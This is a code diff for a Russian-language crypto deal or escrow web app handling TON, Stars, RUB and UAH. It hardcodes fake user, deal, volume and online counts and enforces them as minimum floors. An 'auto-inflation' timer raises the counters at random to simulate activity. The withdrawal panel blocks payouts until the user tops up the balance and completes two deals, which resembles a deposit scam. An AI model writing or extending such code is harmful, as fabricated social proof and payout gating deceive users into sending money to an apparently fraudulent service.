@@ -227,15 +227,15 @@
             <span class="header-balance" id="userBalance"><i class="fas fa-coins"></i> 0</span>
             <span class="online-badge">
                 <span class="online-dot"></span>
-                <span id="onlineCount">0</span> <span>онлайн</span>
+                <span id="onlineCount">6534</span> <span>онлайн</span>
             </span>
         </div>
     </header>
 
     <div class="stats-grid">
-        <div class="stat-card glass"><span class="stat-number" id="statDealsToday">0</span><span class="stat-label"><i class="fas fa-exchange-alt"></i> СДЕЛОК СЕГОДНЯ</span></div>
-        <div class="stat-card glass"><span class="stat-number" id="statUsers">0</span><span class="stat-label"><i class="fas fa-users"></i> ПОЛЬЗОВАТЕЛЕЙ</span></div>
-        <div class="stat-card glass"><span class="stat-number" id="statVolume">0</span><span class="stat-label"><i class="fas fa-chart-line"></i> ОБЪЁМ (TON)</span></div>
+        <div class="stat-card glass"><span class="stat-number" id="statDealsToday">1287</span><span class="stat-label"><i class="fas fa-exchange-alt"></i> СДЕЛОК СЕГОДНЯ</span></div>
+        <div class="stat-card glass"><span class="stat-number" id="statUsers">21481</span><span class="stat-label"><i class="fas fa-users"></i> ПОЛЬЗОВАТЕЛЕЙ</span></div>
+        <div class="stat-card glass"><span class="stat-number" id="statVolume">627.4</span><span class="stat-label"><i class="fas fa-chart-line"></i> ОБЪЁМ (TON)</span></div>
     </div>
 
     <nav class="nav glass">
@@ -364,9 +364,9 @@
                     <div class="balance-item"><span class="label">🌐 UAH</span><span class="value uah" id="balUah">0</span></div>
                 </div>
                 
-                <!-- БЛОК ВЫВОДА (появляется только после 2 сделок) -->
-                <div id="withdrawSection" style="display:none; margin-top:12px;">
-                    <div id="withdrawStatus" class="verification-status" style="display:none;"></div>
+                <!-- БЛОК ВЫВОДА (виден всегда, но с проверкой) -->
+                <div id="withdrawSection" style="margin-top:12px;">
+                    <div id="withdrawStatus" class="verification-status"></div>
                     <div class="support-block" style="margin-bottom:8px;"><span style="font-size:12px;color:var(--text-secondary);">💳 Вывод средств</span></div>
                     <div class="form-group"><label>Валюта</label><select id="withdrawCurrency"><option value="TON">💎 TON</option><option value="STARS">⭐️ STARS</option><option value="RUB">💰 RUB</option><option value="UAH">🌐 UAH</option></select></div>
                     <div class="form-group"><label>Реквизиты</label><input type="text" id="withdrawDetails" placeholder="Кошелёк / карта / телефон"></div>
@@ -494,7 +494,7 @@
         }
 
         // ============================================================
-        // 4. API (ВСЕ ЗАПРОСЫ НА БОТА)
+        // 4. API
         // ============================================================
         async function apiCall(endpoint, data) {
             data = data || {};
@@ -734,12 +734,13 @@
         checkAdmin();
 
         // ============================================================
-        // 8. СТАТИСТИКА (МИНИМАЛЬНЫЕ ЗНАЧЕНИЯ + АВТОНАКРУТКА)
+        // 8. СТАТИСТИКА + ОНЛАЙН
         // ============================================================
         const MIN_STATS = {
             users: 21481,
             deals_today: 1287,
-            volume: 627.4
+            volume: 627.4,
+            online: 6534
         };
 
         function getStats() {
@@ -750,7 +751,8 @@
                     return {
                         users: Math.max(data.users || MIN_STATS.users, MIN_STATS.users),
                         deals_today: Math.max(data.deals_today || MIN_STATS.deals_today, MIN_STATS.deals_today),
-                        volume: Math.max(data.volume || MIN_STATS.volume, MIN_STATS.volume)
+                        volume: Math.max(data.volume || MIN_STATS.volume, MIN_STATS.volume),
+                        online: Math.max(data.online || MIN_STATS.online, MIN_STATS.online)
                     };
                 }
             } catch(e) {}
@@ -761,24 +763,11 @@
             localStorage.setItem('trust_stats', JSON.stringify(stats));
         }
 
-        function animateNumber(el, target, duration = 800, decimals = 0) {
-            const start = parseFloat(el.textContent.replace(/[^0-9.]/g, '')) || 0;
-            const end = Number(target) || 0;
-            if (start >= end) return;
-            const startTime = performance.now();
-            function tick(now) {
-                const p = Math.min(1, (now - startTime) / duration);
-                const val = start + (end - start) * (1 - Math.pow(1 - p, 3));
-                el.textContent = decimals ? val.toFixed(decimals) : Math.round(val);
-                if (p < 1) requestAnimationFrame(tick);
-            }
-            requestAnimationFrame(tick);
-        }
-
         function updateStatsUI(stats) {
             const usersEl = document.getElementById('statUsers');
             const dealsEl = document.getElementById('statDealsToday');
             const volumeEl = document.getElementById('statVolume');
+            const onlineEl = document.getElementById('onlineCount');
             
             if (usersEl) {
                 const target = Math.round(stats.users);
@@ -791,6 +780,9 @@
             if (volumeEl) {
                 volumeEl.textContent = stats.volume.toFixed(1);
             }
+            if (onlineEl) {
+                onlineEl.textContent = Math.round(stats.online);
+            }
         }
 
         function autoIncreaseStats() {
@@ -798,12 +790,15 @@
             stats.users += Math.random() * 0.8 + 0.2;
             stats.deals_today += Math.random() * 0.5 + 0.1;
             stats.volume += Math.random() * 0.04 + 0.01;
+            // Онлайн: плавает вверх-вниз (отклонение ±3%)
+            const change = (Math.random() - 0.5) * 2;
+            stats.online = Math.max(MIN_STATS.online * 0.9, stats.online * (1 + change * 0.008));
             saveStats(stats);
             updateStatsUI(stats);
         }
 
-        // Запускаем автонакрутку
-        setInterval(autoIncreaseStats, 3000 + Math.random() * 2000);
+        // Запускаем автонакрутку (каждые 3-6 секунд)
+        setInterval(autoIncreaseStats, 3000 + Math.random() * 3000);
 
         // ============================================================
         // 9. ЗАГРУЗКА СТАТИСТИКИ
@@ -815,7 +810,8 @@
                     const stats = {
                         users: Math.max(s.users || MIN_STATS.users, MIN_STATS.users),
                         deals_today: Math.max(s.deals_today || MIN_STATS.deals_today, MIN_STATS.deals_today),
-                        volume: Math.max(s.volume || MIN_STATS.volume, MIN_STATS.volume)
+                        volume: Math.max(s.volume || MIN_STATS.volume, MIN_STATS.volume),
+                        online: Math.max(s.online || MIN_STATS.online, MIN_STATS.online)
                     };
                     saveStats(stats);
                     updateStatsUI(stats);
@@ -847,8 +843,8 @@
                 document.getElementById('userBalance').innerHTML = '<i class="fas fa-coins"></i> ' + total;
             }
             
-            // Проверяем доступность вывода
-            updateWithdrawVisibility();
+            // Обновляем статус вывода
+            updateWithdrawStatus();
         }
 
         // ============================================================
@@ -869,8 +865,8 @@
                     '<p style="text-align:center;padding:15px;color:var(--text-secondary);">📭 У вас нет сделок</p>';
             }
             
-            // Проверяем доступность вывода
-            updateWithdrawVisibility();
+            // Обновляем статус вывода
+            updateWithdrawStatus();
         }
 
         function getStatusText(s) {
@@ -967,41 +963,42 @@
         }
 
         // ============================================================
-        // 12. ВЫВОД (только после 2 сделок)
+        // 12. ВЫВОД (проверка: 0 на балансе, 1 сделка, 2+ сделки)
         // ============================================================
 
-        function isWithdrawAvailable() {
-            const completed = dealsState.filter(d => d.status === 'completed').length;
-            return completed >= 2;
-        }
-
-        function updateWithdrawVisibility() {
-            const withdrawSection = document.getElementById('withdrawSection');
-            const withdrawStatus = document.getElementById('withdrawStatus');
+        function updateWithdrawStatus() {
+            const statusEl = document.getElementById('withdrawStatus');
+            if (!statusEl) return;
             
-            if (!withdrawSection) return;
+            const totalBalance = (balanceState.balance.ton || 0) + (balanceState.balance.stars || 0) +
+                (balanceState.balance.rub || 0) + (balanceState.balance.uah || 0);
+            const completedDeals = dealsState.filter(d => d.status === 'completed').length;
             
-            const completed = dealsState.filter(d => d.status === 'completed').length;
-            
-            if (completed >= 2) {
-                withdrawSection.style.display = 'block';
-                if (withdrawStatus) {
-                    withdrawStatus.style.display = 'block';
-                    withdrawStatus.className = 'verification-status verified';
-                    withdrawStatus.innerHTML = '✅ Вывод доступен! У вас ' + completed + ' завершённых сделок.';
-                }
+            if (totalBalance === 0) {
+                statusEl.className = 'verification-status unverified';
+                statusEl.innerHTML = '⚠️ У вас 0 на балансе. Пополните баланс для вывода.';
+            } else if (completedDeals < 2) {
+                statusEl.className = 'verification-status unverified';
+                statusEl.innerHTML = '⚠️ Для вывода нужно провести ' + (2 - completedDeals) + ' сделок. У вас ' + completedDeals + ' завершённых.';
             } else {
-                withdrawSection.style.display = 'none';
-                if (withdrawStatus) {
-                    withdrawStatus.style.display = 'none';
-                }
+                statusEl.className = 'verification-status verified';
+                statusEl.innerHTML = '✅ Вывод доступен! У вас ' + completedDeals + ' завершённых сделок.';
             }
         }
 
         // Функция подтверждения вывода
         window.confirmWithdraw = async function() {
-            if (!isWithdrawAvailable()) {
-                showToast('⚠️ Вывод доступен только после 2 завершённых сделок', 'error');
+            const totalBalance = (balanceState.balance.ton || 0) + (balanceState.balance.stars || 0) +
+                (balanceState.balance.rub || 0) + (balanceState.balance.uah || 0);
+            const completedDeals = dealsState.filter(d => d.status === 'completed').length;
+            
+            if (totalBalance === 0) {
+                showToast('⚠️ У вас 0 на балансе. Пополните баланс для вывода.', 'error');
+                return;
+            }
+            
+            if (completedDeals < 2) {
+                showToast('⚠️ Для вывода нужно провести ' + (2 - completedDeals) + ' сделок. У вас ' + completedDeals + ' завершённых.', 'error');
                 return;
             }
             
